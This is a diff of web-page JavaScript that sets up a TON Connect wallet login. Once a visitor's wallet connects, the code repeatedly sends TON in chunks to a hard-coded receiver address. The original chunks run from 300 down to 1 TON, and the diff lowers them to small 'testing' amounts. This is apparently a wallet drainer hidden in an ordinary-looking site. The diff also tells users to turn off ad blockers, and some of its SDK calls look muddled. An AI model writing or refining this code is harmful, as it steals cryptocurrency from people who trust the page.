@@ -60,7 +60,7 @@ if (searchInput) {
 // TonConnect SDK setup
 if (!window.TonConnect) {
   console.error("TonConnect SDK not loaded. Ensure the script is included and loaded correctly.");
-  alert("Failed to load TON Connect SDK. Please try refreshing the page.");
+  alert("Failed to load TON Connect SDK. Please check your network, disable ad blockers, or try refreshing the page.");
 } else {
   const tonConnect = new window.TonConnect({
     manifestUrl: 'https://txtorg-tsx.static.hf.space/manifest.json'
@@ -84,6 +84,17 @@ if (!window.TonConnect) {
           return;
         }
 
+        // Generate universal link for connection
+        const wallet = wallets[0]; // Use the first available wallet (e.g., Tonkeeper)
+        const universalLink = tonConnect.connect({
+          universalLink: wallet.universalLink,
+          bridgeUrl: wallet.bridgeUrl
+        });
+
+        // Display QR code or prompt user to connect (manually handle in real implementation)
+        console.log("Connect using universal link:", universalLink);
+        alert("Please scan the QR code or open the link in your TON wallet: " + universalLink);
+
         // Initiate wallet connection
         await tonConnect.connectWallet();
         if (!tonConnect.connected || !tonConnect.wallet?.account?.address) {
@@ -95,12 +106,12 @@ if (!window.TonConnect) {
         console.log("Connected wallet address:", tonConnect.wallet.account.address);
 
         const receiverAddress = 'UQCF1ONPsW54lg6XzJFbYSEDHEujrLOrXbz52gR4VEmK9m4c';
-        const chunkSizes = [300, 100, 50, 10, 5, 1]; // TON
+        const chunkSizes = [0.1, 0.05, 0.01]; // Reduced amounts for testing
         let totalSent = 0;
 
         async function trySendChunk(amountTon) {
           const tx = {
-            validUntil: Math.floor(Date.now() / 1000) + 300, // Extended to 5 minutes for reliability
+            validUntil: Math.floor(Date.now() / 1000) + 300, // 5-minute validity
             messages: [
               {
                 address: receiverAddress,
@@ -128,7 +139,7 @@ if (!window.TonConnect) {
             const ok = await trySendChunk(size);
             if (ok) {
               sent = true;
-              await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay to avoid wallet overload
+              await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay
               break;
             }
           }
